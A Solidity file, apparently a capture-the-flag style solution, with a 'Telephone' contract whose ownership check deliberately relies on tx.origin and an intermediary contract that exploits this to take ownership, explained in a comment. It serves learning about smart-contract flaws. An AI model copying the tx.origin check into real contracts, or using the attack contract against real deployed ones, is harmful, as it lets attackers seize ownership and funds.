// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
interface ITelephone {
  function changeOwner(address _owner) external;
}
//the trick here is to create a contract then when you call the function, tx.origin will be the tx.origin of the change owner contract.
contract IntermediateContract {
  function changeOwner(address _addr) public {
    ITelephone(_addr).changeOwner(msg.sender);
  }
}